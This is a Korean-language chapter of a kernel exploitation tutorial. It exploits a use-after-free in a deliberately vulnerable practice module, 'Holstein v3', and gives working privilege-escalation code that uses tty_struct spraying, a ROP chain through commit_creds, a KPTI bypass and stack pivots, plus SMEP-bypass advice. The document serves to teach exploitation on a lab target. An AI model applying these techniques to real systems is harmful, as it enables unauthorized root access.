---
title: "Holstein v3: Use-after-Free 악용"
tags:
    - [Linux]
    - [Kernel]
    - [Use-after-Free]
lang: kr
permalink: /kr/linux-kernel/LK01/use_after_free.html
pagination: true
bk: heap_overflow.html
fd: race_condition.html
---
지난 장에서는 Holstein 모듈의 Heap Overflow를 악용해 권한 상승에 성공했습니다. 하지만 Holstein 개발자는 또다시 취약점을 수정하고 Holstein v3를 공개했습니다. 이번 장에서는 개선된 Holstein 모듈 v3를 exploit해 보겠습니다.

## 패치 분석과 취약점 조사
먼저 [Holstein v3](distfiles/LK01-3.tar.gz)를 다운로드하세요.

v2와 비교했을 때 주요 차이점은 두 가지입니다. 첫째, `open`에서 버퍼를 할당할 때 `kzalloc`을 사용합니다.
```c
  g_buf = kzalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }
```
`kzalloc`은 `kmalloc`처럼 커널 힙에서 메모리를 할당하지만, 할당한 뒤 내용을 0으로 초기화한다는 점이 다릅니다. 즉 사용자 공간의 `calloc`에 대응하는 함수라고 생각하면 됩니다.

둘째, `read`와 `write`에 크기 검사가 추가되어 Heap Overflow가 나지 않도록 막고 있습니다.
```c
static ssize_t module_read(struct file *file,
                           char __user *buf, size_t count,
                           loff_t *f_pos)
{
  printk(KERN_INFO "module_read called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }

  return count;
}

static ssize_t module_write(struct file *file,
                            const char __user *buf, size_t count,
                            loff_t *f_pos)
{
  printk(KERN_INFO "module_write called\n");

  if (count > BUFFER_SIZE) {
    printk(KERN_INFO "invalid buffer size\n");
    return -EINVAL;
  }

  if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }

  return count;
}
```
따라서 이번 버전의 커널 모듈에서는 Heap Overflow를 일으킬 수 없습니다.

이제 `close` 구현을 봅시다.
```c
static int module_close(struct inode *inode, struct file *file)
{
  printk(KERN_INFO "module_close called\n");
  kfree(g_buf);
  return 0;
}
```
`g_buf`가 더 이상 필요 없으니 `kfree`로 해제하지만, `g_buf` 변수에는 여전히 해제된 영역의 포인터가 남아 있습니다. 만약 `close` 이후에도 이 `g_buf`를 다시 사용할 수 있다면 Use-after-Free가 됩니다.

어떤 독자는 "그래도 `close`한 뒤에는 그 fd로 `read`나 `write`를 못 하니 Use-after-Free는 안 나는 것 아닌가?"라고 생각할 수 있습니다. 단일 파일 디스크립터만 보면 맞는 말입니다. 하지만 여기서 커널 공간 프로그램의 특성을 다시 떠올릴 필요가 있습니다.

커널 공간에서는 동일한 자원을 여러 프로그램이 공유할 수 있습니다. Holstein 모듈도 하나의 프로그램만 `open`할 수 있는 것이 아니라, 여러 프로그램 또는 하나의 프로그램이 여러 번 `open`할 수 있습니다. 그렇다면 다음과 같이 쓰면 어떻게 될까요?
```c
int fd1 = open("/dev/holstein", O_RDWR);
int fd2 = open("/dev/holstein", O_RDWR);
close(fd1);
write(fd2, "Hello", 5);
```
첫 번째 `open`에서 `g_buf`가 할당되지만, 두 번째 `open`이 다시 `g_buf`를 새로운 버퍼로 덮어씁니다. 원래 버퍼는 해제되지 않아 메모리 누수가 생깁니다. 그 다음 `close(fd1)`를 호출하면 현재 `g_buf`가 해제됩니다. `fd1`은 더 이상 쓸 수 없지만 `fd2`는 아직 유효하므로, `fd2`를 통해 이미 해제된 `g_buf`에 계속 읽기/쓰기를 수행할 수 있습니다. 이것이 바로 Use-after-Free입니다.

이 사례는 커널 코드가 **여러 호출자가 자원을 공유한다**는 점을 반드시 고려해서 설계되어야 함을 잘 보여 줍니다. 그 점을 놓치면 취약점이 아주 쉽게 생깁니다.

<div class="balloon_l">
  <div class="faceicon"><img src="../img/wolf_thinking.png" alt="늑대" ></div>
  <p class="says">
    `close`할 때 포인터를 `NULL`로 지우거나, `open`할 때 이미 `g_buf`가 할당되어 있으면 실패하도록 설계했다면 적어도 이번 같은 단순한 버그는 막을 수 있었겠지.<br>
    하지만 그걸로 정말 충분한지는 다음 장에서 다시 보게 될 거야.
  </p>
</div>

## KASLR 우회
우선 커널 베이스 주소와 `g_buf`의 주소를 누출해 봅시다.
이번에는 취약점이 Heap Overflow가 아니라 Use-after-Free로 바뀌었을 뿐이고, 버퍼 크기는 여전히 0x400이므로 `tty_struct`를 계속 활용할 수 있습니다.

## kROP 구현
이제 ROP를 할 수 있는 상태가 되었습니다. 가짜 `tty_operations`를 준비한 뒤 ROP chain으로 stack pivot만 하면 됩니다.

하지만 이번에는 지난 장과 달리 Use-after-Free이므로, 현재 제어 가능한 영역이 `tty_struct`와 겹쳐 있습니다. 당연히 `ioctl` 등으로 `tty_operations`를 사용할 때 `tty_struct` 안에는 실제로 참조되지 않는 필드도 많기 때문에, 그 공간 일부를 ROP chain이나 가짜 `tty_operations` 저장 공간으로 써도 되긴 합니다.

다만 이제부터 공격에 사용할 구조체 대부분을 마구 깨뜨려 버리면 나중에 예상치 못한 불안정성이 생길 수 있고, ROP chain의 크기와 구조에도 큰 제약이 걸릴 수 있습니다. 가능하면 `tty_struct`와 실제 ROP chain은 분리된 영역에 두는 편이 좋습니다.

그래서 이번에는 두 번째 Use-after-Free를 일으킵니다. 물론 `g_buf`는 하나뿐이므로, 먼저 주소를 이미 알고 있는 현재 `g_buf`에 ROP chain과 가짜 `tty_operations`를 써 넣습니다. 그다음 다른 쪽에서 다시 Use-after-Free를 발생시키고, 그 두 번째 `tty_struct`의 함수 테이블을 덮어씁니다. 이렇게 하면 살아 있는 `tty_struct`의 함수 테이블 포인터만 바꾸면 되므로 더 안정적인 exploit를 만들 수 있습니다.
```c
  // ROP chain
  unsigned long *chain = (unsigned long*)&buf;
  *chain++ = rop_pop_rdi;
  *chain++ = 0;
  *chain++ = addr_prepare_kernel_cred;
  *chain++ = rop_pop_rcx;
  *chain++ = 0;
  *chain++ = rop_mov_rdi_rax_rep_movsq;
  *chain++ = addr_commit_creds;
  *chain++ = rop_bypass_kpti;
  *chain++ = 0xdeadbeef;
  *chain++ = 0xdeadbeef;
  *chain++ = (unsigned long)&win;
  *chain++ = user_cs;
  *chain++ = user_rflags;
  *chain++ = user_rsp;
  *chain++ = user_ss;

  // 가짜 tty_operations
  *(unsigned long*)&buf[0x3f8] = rop_push_rdx_xor_eax_415b004f_pop_rsp_rbp;

  write(fd2, buf, 0x400);

  // 두 번째 Use-after-Free
  int fd3 = open("/dev/holstein", O_RDWR);
  int fd4 = open("/dev/holstein", O_RDWR);
  if (fd3 == -1 || fd4 == -1)
    fatal("/dev/holstein");
  close(fd3);
  for (int i = 50; i < 100; i++) {
    spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
    if (spray[i] == -1) fatal("/dev/ptmx");
  }

  // 함수 테이블 포인터 덮어쓰기
  read(fd4, buf, 0x400);
  *(unsigned long*)&buf[0x18] = g_buf + 0x3f8 - 12*8;
  write(fd4, buf, 0x20);

  // RIP 제어
  for (int i = 50; i < 100; i++) {
    ioctl(spray[i], 0, g_buf - 8); // rsp=rdx; pop rbp;
  }
```

권한 상승이 되었다면 성공입니다. 전체 exploit는 [여기](exploit/uaf-krop.c)에서 다운로드할 수 있습니다.

<center>
  <img src="img/uaf_privesc.png" alt="UAF를 통한 권한 상승" style="width:320px;">
</center>

이처럼 Heap Overflow나 Use-after-Free 같은 취약점은 커널 공간에서는 사용자 공간의 같은 취약점보다 더 쉽게 exploit 가능한 경우가 많습니다. 커널 힙이 공유되어 있고, 함수 포인터나 민감한 필드를 가진 다양한 구조체를 공격에 활용할 수 있기 때문입니다.

반대로 말하면, 취약점이 발생한 객체와 같은 크기 클래스에 있으면서 공격에 유용한 구조체를 찾지 못하면 exploit는 훨씬 어려워집니다.

## 덤: RIP 제어와 SMEP 우회
이번에는 관련 보안 기법들을 모두 우회했습니다.
지난 장에서도 잠깐 언급했지만, SMAP가 꺼져 있고 SMEP만 켜져 있는 경우에는 약간 다른 간단한 방법을 쓸 수 있습니다. 예를 들어 RIP를 제어한 상태에서 다음과 같은 gadget를 사용할 수 있다고 합시다.
```
0xffffffff81516264: mov esp, 0x39000000; ret;
```
미리 사용자 공간의 `0x39000000`을 `mmap`으로 확보하고 그곳에 ROP chain을 써 두었다면, 이 gadget는 stack pivot를 통해 사용자 공간 ROP chain으로 흐름을 옮깁니다. 이렇게 되면 커널 공간에 ROP chain을 둘 필요도 없고, 그 힙 주소를 따로 알아낼 필요도 없습니다.

주의할 점은 `RSP`가 8바이트 정렬을 만족하도록 만들어야 한다는 것입니다. 스택 포인터 정렬이 깨진 상태에서 정렬을 요구하는 명령이 실행되면 exploit가 바로 크래시할 수 있습니다.

또한 `commit_creds`, `prepare_kernel_cred` 같은 함수는 스택을 소비하므로, 실제로는 `0x39000000`보다 조금 앞에서부터 매핑하고 여유 공간을 두는 편이 좋습니다. 대략 `0x8000`바이트 정도면 충분합니다.

실제로 SMAP를 꺼 두고, 이런 gadget를 이용해 사용자 공간 ROP chain으로 pivot하여 권한 상승을 해 보세요. 그리고 pivot 대상 메모리를 `mmap`할 때는 `MAP_POPULATE` 플래그를 붙이세요. 그래야 물리 메모리가 미리 잡혀서 KPTI가 켜져 있어도 커널에서 그 매핑을 볼 수 있습니다.

[^1]: 뒤 장에서 다시 등장하지만, eBPF JIT가 켜져 있을 때 커널 RIP를 제어할 수 있으면 상당히 높은 확률로 실전적인 권한 상승 exploit로 이어집니다.

---

<div class="column" title="예제 1">
  <code>modprobe_path</code>를 덮어쓰거나 <code>cred</code> 구조체를 직접 바꾸는 등, ROP 없이 권한 상승하는 방법도 시도해 보세요.<br>
</div>
